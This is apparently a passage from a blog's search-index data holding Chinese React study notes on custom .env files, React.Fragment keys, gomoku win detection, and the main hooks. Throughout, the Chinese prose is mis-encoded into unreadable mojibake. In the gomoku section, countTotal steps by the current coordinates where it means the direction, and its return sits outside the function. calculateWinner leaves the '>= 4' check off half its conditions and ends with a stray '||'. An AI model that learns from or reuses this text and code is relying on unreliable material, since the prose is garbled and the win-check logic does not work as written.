className='App-logo' alt='logo' /&gt; &lt;p&gt;Current Version: {process.env.REACT_APP_VERSION}&lt;/p&gt; &lt;p&gt;Current Name: {process.env.REACT_APP_NAME}&lt;/p&gt; &lt;/header&gt; &lt;/div&gt; )}export default App è‡ªå®šç¾© .env æª”æ¡ˆå¦‚æœä½ ä¸æƒ³è¦ç”¨é è¨­æä¾›çš„é‚£äº› .env æª”æ¡ˆåç¨±ï¼ˆ.env.productionã€ .env.development ç­‰ç­‰é‚£äº›ï¼‰ï¼Œè€Œæ˜¯æƒ³è‡ªå·±å–åå­—ï¼Œä¾‹å¦‚èªªæˆ‘æƒ³å»ºç«‹ .env.dev å’Œ .env.demo ä¾†åˆ†åˆ¥çµ¦ Dev / Demo ç’°å¢ƒä½¿ç”¨ã€‚ 1234// .env.devREACT_APP_VERSION=$npm_package_versionREACT_APP_NAME=$npm_package_nameREACT_APP_MESSAGE='Welcome to dev envioment' 1234// .env.demoREACT_APP_VERSION=$npm_package_versionREACT_APP_NAME=$npm_package_nameREACT_APP_MESSAGE='Welcome to demo envioment' é‚£éº¼ç¾åœ¨æœƒç¢°åˆ°çš„å•é¡Œæ˜¯å¦‚æœæ²’å‘Šè¨´ react-scripts çš„è©±ï¼Œä»–éƒ½åƒä¸åˆ°é€™å…©å€‹ .env æª”æ¡ˆçš„å…§å®¹ã€‚ é€™æ™‚å€™å°±å¯ä»¥æŠŠ npm script çš„éƒ¨åˆ†ä¿®æ”¹æˆåº•ä¸‹é€™æ¨£ï¼š 12345678{ \"scripts\": { \"start\": \"sh -ac '. ./.env.dev; react-scripts start'\", \"build\": \"sh -ac '. ./.env.demo; react-scripts build'\", \"test\": \"react-scripts test\", \"eject\": \"react-scripts eject\" }} é™„è¨»ï¼šæ³¨æ„ sh -ac å¾Œé¢è¦åŸ·è¡Œçš„æŒ‡ä»¤è¦æ”¾åœ¨å–®å¼•è™Ÿï¼ˆ'ï¼‰ ä¸­ é—œæ–¼é€™å€‹ sh -ac çš„æ„æ€æˆ‘ä¸æƒ³è§£é‡‹å¤ªæ·±ï¼Œä½†æˆ‘è‡ªå·±çš„ç†è§£æ˜¯ï¼šé€é sh ä¾†åŸ·è¡Œä¸€æ®µ shellã€‚å› ç‚ºæˆ‘å€‘æ˜¯ç›´æ¥å‘¼å« shellï¼Œæ‰€ä»¥æœ‰èƒ½åŠ›æŠŠ .env å¸¶å…¥ process ç‰©ä»¶ä¸­ï¼Œä¸¦ä¸”åŸ·è¡Œ react-scriptsï¼Œè©³ç´°å¯ä»¥åƒè€ƒé€™ç¯‡è¨è«–ã€‚ å¦‚æœä¸Šé¢è½ä¸æ‡‚çš„è©±ä¹Ÿæ²’é—œä¿‚ï¼Œä½ åªè¦çŸ¥é“é€éå®ƒæˆ‘å€‘å°±å¯ä»¥æŠŠæŒ‡å®šçš„ .env ä¾†ä¸Ÿçµ¦ react-scripts åŸ·è¡Œå°±å¥½äº†ã€‚ è¨­å®šå¥½ä»¥å¾ŒåŸ·è¡Œ npm run start æœƒå¾—åˆ°é€™æ¨£çš„çµæœï¼š åŸ·è¡Œ npm run build ä»¥å¾Œæœƒå¾—åˆ°é€™æ¨£çš„çµæœï¼š","link":"/2022/10/26/react-environment-variable/"},{"title":"React Fragmentï¼ä»¥å‰æ²’ç™¼ç¾åˆ°çš„å°æŠ€å·§","text":"è§£æƒ‘äº†ã€‚ ç°¡è¿°å¯«é React çš„äººæ‡‰è©²éƒ½çŸ¥é“ï¼Œä¸€å€‹ Component åªå¯ä»¥ç”¨ä¸€å€‹æ ¹å…ƒç´ ï¼Œåƒé€™æ¨£ï¼š 12345678function Component () { return ( &lt;div&gt; &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;PeaNu's party time&lt;/p&gt; &lt;/div&gt; )} å¦‚æœå¯«æˆé€™æ¨£çš„è©±å°±æœƒå ±éŒ¯ï¼š 123456function Component () { return ( &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;PeaNu's party time&lt;/p&gt; )} ä½†å¦‚æœå¤–é¢ä¸æƒ³åŒ…ä¸€å±¤ &lt;div&gt; çš„è©±æ€éº¼è¾¦ï¼Ÿé€™æ™‚å€™æœ€ç°¡å–®çš„ä½œæ³•å°±æ˜¯æ”¹ç”¨ React Fragment ä¾†åŒ…ä½ï¼š 12345678function Component () { return ( &lt;&gt; &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;PeaNu's party time&lt;/p&gt; &lt;/&gt; )} å¯æ˜¯å¦‚æœæ˜¯ã€Œæ¸²æŸ“åˆ—è¡¨ã€çš„æƒ…æ³ä¸‹ï¼Œé€™æ¨£æœƒæœ‰ä¸€é»å•é¡Œï¼š 1234567891011function Component () { return ( {items.map(item =&gt; ( &lt;key={item.id}&gt; &lt;ul&gt; &lt;li&gt;{item.value}&lt;/li&gt; &lt;/ul&gt; &lt;/&gt; ))} )} ç•¶è¦å‚³å…¥ key é€™å€‹ props æ™‚å°±æ²’è¾¦æ³•ç”¨ &lt;&gt;&lt;/&gt; çš„æ–¹å¼ä¾†å¯«ã€‚ ä½†å¦‚æœé‚„æ˜¯æƒ³ç”¨ Fragment çš„è©±æ€éº¼è¾¦ï¼Ÿå…¶å¯¦å¯ä»¥æ”¹å¯«æˆé€™æ¨£ï¼š 1234567891011function Component () { return ( {items.map(item =&gt; ( &lt;React.Fragment key={item.id}&gt; &lt;ul&gt; &lt;li&gt;{item.value}&lt;/li&gt; &lt;/ul&gt; &lt;/React.Fragment&gt; ))} )} å—¯ï¼é€™å€‹å°±æ˜¯é€™ç¯‡æ–‡ç« æƒ³èªªçš„ï¼š React.Fragment æ˜¯å¯ä»¥æœ‰ props çš„ï¼Œåªæ˜¯ä¸å¯ä»¥ç”¨åœ¨ç¸®å¯«çš„å½¢å¼ã€‚","link":"/2022/06/06/react-fragment-props/"},{"title":"React é—œæ–¼äº”å­æ£‹åˆ¤æ–·è¼¸è´çš„æ€è·¯","text":"åªæ˜¯æƒ³è¨˜ä¸€ä¸‹ï¼Œå› ç‚ºæˆ‘æƒ³äº†å¥½ä¹…å»æ²’æƒ³å‡ºä¾†ã€‚ ç°¡è¿°å‰å¹¾å¤©å‰›åšå®Œ äº”å­æ£‹ é€™ä»½ä½œæ¥­ã€‚ ä½†å› ç‚ºæˆ‘æƒ³äº†å¾ˆä¹…éƒ½æƒ³ä¸å‡ºã€Œæ–œç·šã€çš„è§£æ³•ï¼Œæ‰€ä»¥ç‰¹åœ°é–‹é€™ç¯‡ä¾†è¨˜éŒ„ä¸€ä¸‹é€™å€‹å¾ˆæ£’çš„è§£æ³•ã€‚ æ€è·¯è§£é‡‹å…ˆèªªä¸€ä¸‹æˆ‘åŸæœ¬çš„æ€è·¯å§ã€‚ æˆ‘çš„æƒ³æ³•æ˜¯é€éã€Œæ•´å€‹æ£‹ç›¤ã€ä¾†åˆ¤æ–·è¼¸è´ï¼Œè¬›ç™½è©±ä¸€é»å°±æ˜¯ã€Œæ¯ä¸€æ¬¡éƒ½æŠŠæ•´å‰¯æ£‹ç›¤çœ‹éä¸€éã€ï¼Œæ‰¾å‡ºèª°é”æˆé€£ç·šå°±èª°å°±è´äº†ã€‚ æ‰€ä»¥å°±å¯«äº†é€™æ¨£çš„ codeï¼ˆåªæ˜¯å¤§æ¦‚å¯«ä¸€ä¸‹æ¦‚å¿µï¼‰ï¼š 123456789101112// é™„è¨»ï¼šboard æ˜¯ä¸€å€‹äºŒç¶­é™£åˆ—function calculateWinner (board) { // éæ­·æ¯ä¸€å€‹ row for(let i=0; i&lt;board.length; i++) { // å…ˆçœ‹æ©«ç·š checkHorizontal(board[i]); // å†çœ‹ç›´ç·š checkVertiacl(board[i]); // æ¥è‘—çœ‹æ–œç·šï¼Œä½†æˆ‘æ²’æƒ³å‡ºä¾† }}const winner = calculateWinner(board); ç¸½ä¹‹ï¼Œé€™å€‹æ–¹æ³•é¡¯ç„¶ä¸æ˜¯å¾ˆå¥½ï¼Œä¹Ÿä¸è°æ˜ã€‚æ‰€ä»¥æ¥è‘—ä¾†çœ‹çœ‹å¦ä¸€ç¨®æ€è·¯å§ï¼Œé€™å€‹æ€è·¯åªè¦æƒ³æ¸…æ¥šä»¥å¾Œå°±æœƒè¦ºå¾—å¾ˆç›´è¦ºã€‚ é¦–å…ˆï¼Œåˆ†å‡ºå‹è² çš„æ™‚æ©Ÿé»ä¸€å®šæ˜¯å‡ºç¾åœ¨ã€Œä¸‹äº†æŸä¸€æ”¯æ£‹ã€çš„æƒ…æ³ï¼Œé€™ä»£è¡¨ä»€éº¼ï¼Ÿä»£è¡¨å…¶å¯¦åªéœ€è¦çœ‹é€™éš»æ£‹çš„é™„è¿‘æ˜¯ä¸æ˜¯æœ‰å¯ä»¥è·Ÿå®ƒæ¹Šæˆé€£ç·šçš„æ£‹å°±å¥½ï¼Œé€™æ¨£å°±ä¸ç”¨æ•´å€‹çœ‹éä¸€éäº†ã€‚ å¦‚æœä½ çš„æ£‹ç›¤æ˜¯ç”¨äºŒç¶­é™£åˆ—ä¾†å­˜çš„ï¼Œå°±æ‡‰è©²æœƒæœ‰ x è»¸å’Œ y è»¸é€™å…©å€‹è³‡è¨Šï¼Œæ¥è‘—åªè¦çµ¦å®ƒä¸€å€‹ã€Œæ–¹å‘ã€å°±å¥½ï¼Œå‘Šè¨´å®ƒæˆ‘è¦å¾€å“ªå€‹æ–¹å‘å»çœ‹ï¼Œåƒé€™æ¨£ï¼š çŸ¥é“æ–¹å‘ä»¥å¾Œï¼Œåªè¦ç”¨ä¸€å€‹è¿´åœˆå°±å¯ä»¥é”æˆæœå°‹çš„æ•ˆæœäº†ï¼š 123456789101112131415161718192021222324function countTotal(board, currentX, currentY, directionX, directionY) { // ç¾åœ¨è¦æª¢æŸ¥çš„æ£‹å­é¡è‰² const now = board[currentY][currentX]; let tempX = currentX; let tempY = currentY; let total = 0; do { // æª¢æŸ¥ä¸‹ä¸€å€‹æ£‹å­ tempX += currentX; tempY += currentY; // è¶…å‡ºæ£‹ç›¤ç¯„åœå°±ä¸ç”¨åœ¨åˆ¤æ–·äº†ï¼ˆY è»¸çš„éƒ¨åˆ†ï¼‰ // è‡³æ–¼ X è»¸ä¸å¯«æ˜¯å› ç‚ºå¾—é€é board[y][x] æ‰èƒ½å–å¾—ï¼Œå¤šåŠ ä¸€å±¤ &amp; board[tempY][tempX] çš„æ„ç¾©ä¸å¤§ // åæ­£å¾Œé¢è·Ÿ now æ¯”è¼ƒæ™‚ä¸€å®šæœƒæ˜¯ false if (board[tempY] &amp;&amp; board[tempY][tempX] === now) { total++; } else { break; } } while (true)}// å›å‚³é€£çºŒæ¬¡æ•¸return total; æ¥ä¸‹ä¾†å°±åªè¦å°æ¯å€‹æ–¹å‘åšè¨ˆç®—å°±å¥½äº†ï¼š 123456789101112131415function calculateWinner (board, x, y) { if ( countTotal(board, x, y, 0, -1) &gt;= 4 || countTotal(board, x, y, 0, 1) || countTotal(board, x, y, -1, 0) &gt;= 4 || countTotal(board, x, y, 1, 0) || countTotal(board, x, y, 1, -1) &gt;= 4 || countTotal(board, x, y, -1, 1) || countTotal(board, x, y, 1, 1) &gt;= 4 || countTotal(board, x, y, -1, -1) || ) { // æœ‰è´å®¶çš„è©± return board[y][x] } // å¹³æ‰‹çš„æƒ…æ³ if (board.every(row =&gt; row.every(col =&gt; col))) { return 'draw' }} é—œæ–¼å¹³æ‰‹çš„éƒ¨åˆ†å¦‚æœçœ‹ä¸å¤ªæ‡‚ï¼Œå¯ä»¥é€™æ¨£æƒ³å°±å¥½ board.every(true / false)ï¼Œè£¡é¢æ”¾ true å°±æœƒå›å‚³ trueï¼Œåä¹‹å‰‡ falseã€‚ è€Œæˆ‘å€‘åœ¨è£¡é¢åšçš„äº‹æƒ…åªæ˜¯å»æª¢æŸ¥ row è£¡é¢çš„ col æ˜¯ä¸æ˜¯éƒ½æœ‰å€¼ï¼Œå¦‚æœéƒ½æœ‰å°±æœƒå›å‚³ true ä»£è¡¨æ£‹ç›¤å·²ç¶“æ”¾æ»¿äº†ï¼Œæ‰€ä»¥æ˜¯å¹³æ‰‹ã€‚ ä»¥ä¸Šå°±æ˜¯åˆ¤æ–·è¼¸è´çš„æ€è·¯ï¼Œå¸Œæœ›æˆ‘å“ªå¤©ä¹Ÿèƒ½åªé è‡ªå·±å°±æƒ³å‡ºé€™ç¨®è§£æ³• QQ","link":"/2022/04/19/react-gomoku-thinking/"},{"title":"React é‡æ–°è¤‡ç¿’ hooks","text":"å‰›çœ‹å®Œå®˜æ–¹æ–‡ä»¶ï¼Œä¾†ç•™å€‹ç´€éŒ„ã€‚ ç°¡è¿°ä¹‹å‰æœ‰é‡å°å„å€‹ hooks å¯«éç³»åˆ—ç­†è¨˜ï¼š React çš„ç¬¬ä¸€å€‹ hookï¼šuseState React çš„ç¬¬äºŒå€‹ hookï¼šuseRef React çš„ç¬¬ä¸‰å€‹ hookï¼šuseEffect React çš„ç¬¬å››å€‹ hookï¼šuseLayoutEffect React çš„ç¬¬äº”å€‹ hookï¼šmemo React çš„ç¬¬å…­å€‹ hookï¼šuseCallback React çš„ç¬¬ä¸ƒå€‹ hookï¼šuseMemo React çš„ç¬¬å…«å€‹ hookï¼šuseContext èˆ‡ createContext ä½†ç•¶æ™‚é‚„æ²’æœ‰ä»”ç´°çœ‹éå®˜æ–¹æ–‡ä»¶ï¼Œå¯èƒ½å¯«å¾—ä¸æ˜¯å¾ˆå®Œæ•´ï¼Œæ‰€ä»¥é€™ç¯‡æœƒå¯«å¾—æ›´è©³ç´°ä¸€äº›ã€‚ å…¶ä»–è£œå……èˆ‰å‡¡åƒæ˜¯ setState æˆ– dispatch ç­‰ç­‰é€™äº›å¾ hook å›å‚³çš„ functionï¼Œéƒ½ä¸æœƒåœ¨ re-render çš„æ™‚å€™è¢«æ”¹è®Šï¼Œæ‰€ä»¥æ‰å¯ä»¥ä¸ç”¨åœ¨ useEffect æˆ– useCallback æŠŠå®ƒå€‘å‚³åˆ° dependencies ä¸­ã€‚ useState ç”¨ä¾†ç”¢ç”Ÿã€Œstateã€çš„ function å›å‚³å€¼æœ‰å…©å€‹ï¼Œç¬¬ä¸€å€‹æ˜¯ state çš„å€¼ï¼Œç¬¬äºŒå€‹æ˜¯æ”¹è®Š state æ™‚æœƒç”¨åˆ°çš„ setterï¼š 1const [counter, setCounter] = useState(0); æ‰€ä»¥è¦åœ¨ä¸€å€‹å…ƒä»¶é¡¯ç¤º state çš„è©±åªè¦ï¼š 1&lt;button&gt;{counter}&lt;/button&gt; å°±æœƒçœ‹åˆ°ä¸€å€‹ 0 çš„æŒ‰éˆ•äº†ã€‚ è€Œè¦æ”¹è®Š state çš„è©±å°±è¦é€é setter ä¾†æ”¹è®Šï¼Œåƒé€™æ¨£ï¼š 12// ç”¨ setCounter ä¾†æ›´æ–° state&lt;button onClick={() =&gt; setCounter(prev =&gt; prev + 1)}&gt;{counter}&lt;/button&gt; é€™æ¨£å­æ¯é»ä¸€ä¸‹æŒ‰éˆ• counter çš„å€¼å°±æœƒåŠ ä¸€ã€‚ å¦å¤–æˆ‘æƒ³è£œå……ä¸€å€‹è§€å¿µï¼Œå°±æ˜¯æ¯æ¬¡ re-render æ™‚ state æœƒæ€éº¼é‹ä½œï¼Ÿ åƒæˆ‘ä¹‹å‰å°±æœ‰æƒ³éï¼Œå¦‚æœ re-render ç­‰æ–¼é‡æ–°åŸ·è¡Œä¸€æ¬¡ function component çš„å…§å®¹çš„è©±ï¼Œé‚£è£¡é¢çš„ useState ä¸å°±åˆæœƒé‡æ–°åŸ·è¡Œä¸€æ¬¡äº†å—ï¼Ÿé€™æ¨£çš„è©± state ä¸å°±æœƒåˆè®Šæˆæœ€é–‹å§‹çš„åˆå§‹å€¼äº†ï¼Ÿï¼ˆ0ï¼‰ åˆ—å€‹æµç¨‹ï¼Œæ‡‰è©²æœƒæ¯”è¼ƒå¥½ç†è§£æˆ‘çš„æ„æ€ï¼š ç¬¬ä¸€æ¬¡ render åŸ·è¡Œ useState(0)ï¼Œcounter çš„åˆå§‹å€¼ç‚º 0 é»æŒ‰éˆ•ï¼Œæ›´æ–° state è®“ counter è®Šæˆ 1ï¼Œè§¸ç™¼ re-render å†åŸ·è¡Œä¸€æ¬¡ useState(0)ï¼Œcounter çš„å€¼ç‚º 0ï¼Ÿé‚„æ˜¯ 1ï¼Ÿ æˆ‘å€‘ç•¶ç„¶çŸ¥é“ç­”æ¡ˆæœƒæ˜¯ 1ï¼Œä½†é€™æ˜¯ç‚ºä»€éº¼ï¼ŸåŸä¾†å®˜æ–¹æ–‡ä»¶è£¡é¢æœ‰æåˆ°ï¼š During subsequent re-renders, the first value returned by useState will always be the most recent state after applying updates. ç°¡å–®ä¾†èªª re-render æ™‚ useState ç¢ºå¯¦æœƒè¢«é‡æ–°åŸ·è¡Œï¼Œä½†å®ƒæœƒç¢ºä¿ç¬¬ä¸€å€‹å›å‚³å€¼ï¼ˆä¹Ÿå°±æ˜¯ stateï¼‰æ˜¯æœ€æ–°çš„é‚£å€‹å€¼ã€‚ æœ€å¾Œè£œå……å¹¾å€‹å…¶ä»–ç‰¹æ€§ï¼š æ›´æ–° state çš„æ–¹å¼æœ‰å…©ç¨®ï¼Œç›´æ¥å‚³å€¼çš„å«åšã€Œnormal formã€ï¼Œé€é prev çš„å«åšã€Œfunctional formã€ï¼Œå¦‚æœæ–°çš„ state å¿…é ˆç”¨ prev å€¼ä¾†è¨ˆç®—çš„è©±å»ºè­°ç”¨å¾Œè€…æ¯”è¼ƒå®‰å…¨ å¦‚æœæ–°çš„ state è·Ÿ ç›®å‰çš„ state ä¸€æ¨£ï¼Œå°±ä¸æœƒè§¸ç™¼ re-render åœ¨ hook è£¡é¢å°±ç®—åªæœ‰è¦æ”¹ state çš„æŸå€‹éƒ¨åˆ†ï¼Œä¹Ÿå¿…é ˆæŠŠå®Œæ•´çš„ state çµ¦æ”¾é€²å»ï¼Œè€Œä¸æ˜¯åƒ class component ä¸€æ¨£å¯ä»¥åªå¯«è¦æ”¹çš„åœ°æ–¹å°±å¥½ï¼ˆé€™å€‹å¾ˆé‡è¦å“¦ï¼‰ å¦‚æœ state çš„åˆå§‹å€¼å¾—ç”¨è¤‡é›œè¨ˆç®—ä¾†æ±‚å‡ºï¼Œå¯ä»¥åœ¨ useState è£¡æ”¹å‚³é€²ä¸€å€‹ functionï¼Œé€™å€‹åªæœƒåœ¨ç¬¬ä¸€æ¬¡ render çš„æ™‚å€™è¢«åŸ·è¡Œï¼Œå¾ŒçºŒçš„ä¸æœƒï¼ŒæŠ€è¡“ä¸Šç¨±ç‚ºã€ŒLazy initial stateã€ å‡è¨­ä¸€æ¬¡æ›´æ–°å…©å€‹ stateï¼ŒReact æœƒè‡ªå‹•åˆåœ¨ä¸€èµ·ï¼Œè®Šæˆåª re-render ä¸€æ¬¡ã€‚åœ¨ 18.0 ä»¥å‰åªæœ‰ Event handler è£¡é¢çš„æ›´æ–° state æœƒæœ‰é€™æ•ˆæœï¼Œä½†é€™ä¹‹å¾Œå°±ä¸ä¾·é™äº†ï¼Œæƒ³çœ‹ç¯„ä¾‹å¯ä»¥åƒè€ƒé€™è£¡ useEffectå°±è·Ÿèª²ç¨‹è¬›çš„ä¸€æ¨£ï¼Œæ„æ€æ˜¯ï¼š render å®Œä»¥å¾Œæƒ³åšä»€éº¼ï¼Ÿ ç‚ºä»€éº¼æœƒå–åç‚ºã€ŒEffectã€ï¼Ÿå…¶å¯¦æ˜¯å› ç‚º React å¸Œæœ›ä½ ç”¨é€™å€‹ hook ä¾†è™•ç†ã€Œside effectï¼ˆå‰¯ä½œç”¨ï¼‰ã€ï¼Œæ„æ€æ˜¯æŒ‡è·Ÿ React æœ¬èº«ç„¡é—œçš„äº‹æƒ…ï¼Œåƒæ˜¯ã€Œç™¼ API æ‹¿è³‡æ–™ã€ã€ã€Œå„²å­˜åˆ° storageã€ç­‰ç­‰ã€‚ é€™äº› effect é›–ç„¶å¾ˆé‡è¦ï¼ˆå› ç‚ºæœ‰å¯èƒ½æœƒæ”¹è®Šå…§å®¹ï¼‰ï¼Œä½†å° React åœ¨æ¸²æŸ“ Component çš„æ™‚å¾Œä¾†èªªæ˜¯ä¸é‡è¦çš„ï¼Œæ‰€ä»¥æ‰æœƒèªªé€™æ˜¯ side effectã€‚ ç¸½ä¹‹å‘¢ï¼Œä¸è¦æŠŠä¸€äº›è·Ÿ Component æ²’æœ‰ç›´æ¥é—œä¿‚çš„æ±è¥¿å¯«åœ¨è£¡é¢ï¼Œåƒé€™æ¨£ï¼š 123function Component() { fetch('...');} è€Œæ˜¯è¦é€™æ¨£ï¼š 12345678function Component() { return (...)}// render å®Œä»¥å¾Œæ‰å»ç™¼ APIuseEffect(() =&gt; { fetch('...')}) ä¸é useEffect é è¨­æ˜¯æ¯æ¬¡ render ä»¥å¾Œéƒ½æœƒè¢«åŸ·è¡Œï¼Œæ‰€ä»¥æ›´æº–ç¢ºçš„ä½œæ³•æ˜¯åŠ ä¸Šç¬¬äºŒå€‹åƒæ•¸ï¼ˆdependenciesï¼‰ä¾†å‘Šè¨´å®ƒã€Œç•¶æŸæŸå€¼æ”¹è®Šçš„æ™‚å€™å†å¹«æˆ‘åŸ·è¡Œé€™å€‹ effectã€ï¼š 123456789function Component() { return (...)}// ä¸ç®¡å‚³ä»€éº¼ç¬¬ä¸€æ¬¡éƒ½ä¸€å®šæœƒè¢«åŸ·è¡Œ// æ‰€ä»¥é€™é‚Šå‚³ç©ºçš„ä»£è¡¨æˆ‘åªå¸Œæœ›ä»–è¢«åŸ·è¡Œä¸€æ¬¡useEffect(() =&gt; { // render å®Œä»¥å¾Œæ‰å»ç™¼ API fetch('...')}, []) åŸºæœ¬ä¸Šå‘¢ï¼Œåªè¦æ˜¯å‡ºç¾åœ¨ useEffect è£¡çš„ props æˆ– stateï¼Œéƒ½æ‡‰è©²è¦æ”¾åœ¨ dependencies è£¡é¢ï¼Œå¦å‰‡ç•¶å€¼æ”¹è®Šæ™‚å®ƒå€‘é‚„æ˜¯æœƒåœç•™åœ¨èˆŠçš„é‚£å€‹å€¼ï¼Œé€™å€‹è¦å¤šæ³¨æ„ä¸€ä¸‹ã€‚ æ¥è‘—åšä¸€å€‹è£œå……ï¼ŒuseEffect æ¯æ¬¡åœ¨åŸ·è¡Œ side effect ä»¥å‰æœƒå…ˆæŠŠä¸Šä¸€æ¬¡çš„ effect çµ¦æ¸…æ‰ï¼Œé€™å€‹éšæ®µå«åšã€Œclean up effectã€ï¼Œé€™æ¨£åšæ˜¯ç‚ºäº†ç¢ºä¿ã€Œmemory weakï¼ˆç°¡å–®ä¾†èªªå°±æ˜¯è¨˜æ†¶é«”æµªè²»å§ï¼Ÿï¼‰ã€çš„å•é¡Œã€‚ å¦å¤– useEffect è£¡é¢å…¶å¯¦é‚„å¯ä»¥åœ¨å›å‚³å¦ä¸€å€‹ functionï¼Œå®ƒæœƒåœ¨ component å¾ç•«é¢ä¸Šç§»é™¤å‰çµ¦åŸ·è¡Œï¼Œåƒé€™æ¨£ï¼š 12345678function Message() { useEffect(() =&gt; { // render ä»¥å¾ŒåŸ·è¡Œ console.log(\"Message has rendered.\"); // å›å‚³ functionï¼Œè¢«ç§»é™¤å‰æœƒåŸ·è¡Œ return () =&gt; console.log(\"before Message remove.\"); });} æƒ³çœ‹å¯¦éš›æ•ˆæœå¯ä»¥åˆ° é€™é‚Š çœ‹ã€‚ useContext æŠŠ props èšé›†åˆ°ä¸€å€‹åœ°æ–¹ç®¡ç† ç°¡å–®ä¾†èªªå°±æ˜¯é€™æ¨£ã€‚ èˆ‰å€‹ä¾‹å­ï¼Œç•¶ä½ çš„ props è¦é€šéã€Œå¾ˆå¤šå±¤ä¾†å‚³éæ™‚ã€ï¼Œå¯èƒ½å°±æœƒå¯«å‡ºé€™æ¨£çš„æ±è¥¿ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243// è¦å¾€ä¸‹å‚³éçš„ propsconst theme = { light: { bg: \"white\", color: \"black\", }, dark: { bg: \"black\", color: \"white\", },};// ç¬¬ä¸‰å±¤ï¼Œçµ‚æ–¼æ‹¿åˆ° propsfunction Content({ theme }) { return ( &lt;div style={{ backgroundColor: theme.bg, color: theme.color, }} &gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Odio eos neque explicabo soluta excepturi impedit aperiam necessitatibus fugiat officia recusandae quidem consequuntur, minus facere suscipit quam asperiores ipsum. Impedit, facilis? &lt;/div&gt; );}function Wrapper({ theme }) { // ç¬¬äºŒå±¤ return &lt;Content theme={theme} /&gt;;}function App() { const [isDarkmode, setIsDarkMode] = useState(true); return ( &lt;div className=\"App\"&gt; // ç¬¬ä¸€å±¤ &lt;Wrapper theme={theme.dark} /&gt; &lt;/div&gt; );} æœ‰åŒå­¸ç”¨èªªé€™æ¨£çš„å ´æ™¯å°±è·Ÿã€Œæ¥åŠ›æ£’ã€å¾ˆåƒï¼Œæˆ‘è¦ºå¾—é€™é‚„è »è²¼åˆ‡çš„ XD ä½†å¦‚æœæ”¹ç”¨ useContext å’Œ createContext å°±èƒ½å¤§å¤§ç¯€çœæ‰é€™å€‹å›°æ“¾ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354const theme = { light: { bg: \"white\", color: \"black\" }, dark: { bg: \"black\", color: \"white\" }};// 1. å»ºç«‹ Contextconst ThemeContext = createContext(null);function Content() { // 3. å–å¾— Context çš„å€¼ const theme = useContext(ThemeContext); return ( &lt;div style={{ backgroundColor: theme.bg, color: theme.color }} &gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Odio eos neque explicabo soluta excepturi impedit aperiam necessitatibus fugiat officia recusandae quidem consequuntur, minus facere suscipit quam asperiores ipsum. Impedit, facilis? &lt;/div&gt; );}function Wrapper() { return &lt;Content /&gt;;}function App() { const [isDarkmode, setIsDarkMode] = useState(true); return ( // 2. å»ºç«‹ Provider å’Œè¦æä¾›çš„å€¼ï¼ˆvalueï¼‰ &lt;ThemeContext.Provider value={isDarkmode ? theme.dark : theme.light}&gt; &lt;div className=\"App\"&gt; &lt;Wrapper /&gt; // æŒ‰ä¸‹æŒ‰éˆ•æ™‚åˆ‡æ›ä¸»é¡Œ &lt;button onClick={() =&gt; setIsDarkMode((prev) =&gt; !prev)}&gt; switch theme &lt;/button&gt; &lt;/div&gt; &lt;/ThemeContext.Provider&gt; );}ReactDOM.render(&lt;App /&gt;, document.getElementById(\"root\")); æƒ³çœ‹æ•ˆæœçš„è©±å¯ä»¥åˆ° é€™è£¡ çœ‹ã€‚ ç¸½ä¹‹å‘¢ï¼Œåƒé€™æ¨£æŠŠ props é›†ä¸­åˆ° Context ä¾†è™•ç†æœƒå¥½ç®¡ç†å¾ˆå¤šï¼Œä¹Ÿä¸ç”¨åƒå‰›å‰›é‚£éº¼ hardcode æ¯ä¸€å±¤éƒ½å¾—å‚³ä¸€éã€‚ useReducer å»å­¸ redux å§ï¼Œç•¢ç«Ÿé€™è·Ÿå®ƒæœ‰é—œã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯ç”¨ä¾†å–ä»£ useState çš„å¦ä¸€ç¨® hookï¼Œæœƒéœ€è¦å®ƒæ˜¯å› ç‚ºç•¶ state å¾ˆå¤šæˆ–å¾ˆè¤‡é›œçš„æ™‚å€™ï¼Œè¦å‚³éå„ç¨® props ä¹Ÿæœƒè®Šå¾—å¾ˆéº»ç…©ï¼Œæ‰€ä»¥æ‰æœƒç”¨é€™ç¨®é¡ä¼¼ã€Œfluxã€æ–¹å¼ä¾†é›†ä¸­ç®¡ç†ã€‚ é€™é‚Šå…ˆå¤§æ¦‚çŸ¥é“æ€éº¼ç”¨å°±å¥½ï¼Œå…¶ä»–çš„ç­‰å­¸ Redux å†èªªå§ï¼ 1234567891011121314151617181920212223242526272829// state åˆå§‹å€¼const initialState = { count: 0 };// reducerï¼Œç”¨ä¾†ç®¡ç† state çš„å·¥å…·äºº// æœƒæ ¹æ“š action ä¾†æ›´æ–° state const reducer = (state, action) =&gt; { switch (action.type) { case \"increment\": return { count: state.count + 1 }; case \"decrement\": return { count: state.count - 1 }; default: throw new Error(); }};function App() { // ä½¿ç”¨å®ƒï¼Œè¦è¨˜å¾—å‚³å…¥å‰é¢å¯«çš„ reducer è·Ÿ state const [state, dispatch] = useReducer(reducer, initialState); return ( &lt;div className=\"App\"&gt; count: {state.count} // æ¥è‘—é€é dispatch è·Ÿ reducer èªªæˆ‘æƒ³åšä»€éº¼ &lt;button onClick={() =&gt; dispatch({type: \"increment\"})}&gt;+&lt;/button&gt; &lt;button onClick={() =&gt; dispatch({type: \"decrement\"})}&gt;-&lt;/button&gt; &lt;/div&gt; );} æ•ˆæœå¯ä»¥åˆ° é€™é‚Š çœ‹ã€‚ ç¸½ä¹‹ï¼Œé€™æ¨£çš„å¥½è™•æ˜¯ä¸ç”¨åœ¨é€é props æŠŠæ›´æ–° state çš„ callback å‚³çµ¦å­å…ƒä»¶ï¼Œå­å…ƒä»¶åªè¦å…ˆ useReducerï¼Œå†é€é dispatch ä¾†æŒ‡æ´¾ä»»å‹™å°±å®Œäº‹äº†ã€‚ useCallback æŠŠ function è¨˜èµ·ä¾†ã€‚ é€™å€‹æ˜¯æ‹¿ä¾†åšå„ªåŒ–æ™‚æ¯”è¼ƒæœƒç”¨åˆ°ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘å¯èƒ½æœƒåœ¨ä¸€å€‹ Component ä¸­å®šç¾© functionï¼š 12345function App() { const [someState, setSomeState] = useState(\"hello\"); const doSomething = () =&gt; console.log(someState); ...} 